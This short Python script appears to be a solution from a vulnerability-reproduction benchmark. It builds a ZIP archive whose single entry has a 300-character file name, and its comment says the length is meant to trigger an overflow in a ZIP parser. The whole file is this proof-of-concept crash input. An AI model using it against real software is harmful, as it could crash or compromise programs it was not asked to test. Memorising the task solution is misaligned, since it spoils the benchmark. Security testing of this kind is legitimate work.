import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        long_name = "A" * 300  # >256 to trigger overflow
        mem = io.BytesIO()
        with zipfile.ZipFile(mem, mode="w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_name, b"")
        return mem.getvalue()
